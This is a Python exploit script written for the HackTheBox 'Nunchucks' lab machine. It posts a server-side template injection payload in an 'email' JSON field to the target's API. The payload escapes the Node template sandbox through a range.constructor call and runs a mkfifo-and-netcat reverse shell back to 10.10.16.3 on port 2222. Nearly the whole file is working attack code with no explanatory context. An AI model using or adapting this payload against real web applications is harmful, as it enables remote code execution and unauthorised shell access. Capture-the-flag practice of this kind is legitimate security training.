#!/usr/bin/env python3

'''

Author: Declan Middleton
License: MIT
github: https://github.com/declanmiddleton
linkedin: https://www.linkedin.com/in/declanmiddleton/
HackTheBox: declanmiddleton

Made for Nunchuck Machine on HTB

'''

import requests
import urllib3
from bs4 import BeautifulSoup
import os

host = "https://store.nunchucks.htb/api/submit"
http_proxy = {"http": "127.0.0.1:8080"}  
file_path_linux = "/etc/hosts"
session = requests.session()

class Code_Execution:
    def __init__(self):
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.payload = {"email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 2222 >/tmp/f')\")()}}"}
    
    def send_shell(self):
        try:
            print("[+] Sending payload")
            r = session.post(
                url=host, 
                headers=self.headers, 
                json=self.payload,  
                proxies=http_proxy, 
                verify=False
            )
            

            if r.status_code == 200:
                print(f"[+] Payload sent successfully! Status: {r.status_code}")
                print("[+] Check your listener")
            else:
                print(f"[-] Failed to send payload. Status: {r.status_code}")
                print(f"Response: {r.text}")
                
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    if os.path.exists(file_path_linux):
        print("[+] Hosts file exists")
    
    exploit = Code_Execution()
    exploit.send_shell()